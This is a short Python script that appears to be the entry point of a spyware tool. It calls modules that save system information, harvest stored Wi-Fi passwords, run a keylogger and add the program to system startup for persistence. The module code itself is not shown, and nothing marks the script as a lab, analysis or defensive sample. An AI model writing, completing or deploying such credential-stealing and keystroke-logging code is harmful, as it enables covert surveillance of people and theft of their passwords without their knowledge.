from modules.info import save
from modules.wifi import WifiPasswords
from modules.keylogger import Keylogger
from modules.startup import StartUp


save()

wifi = WifiPasswords()
wifi.run()

Logger = Keylogger()
Logger.run()

startup = StartUp()
startup.run()
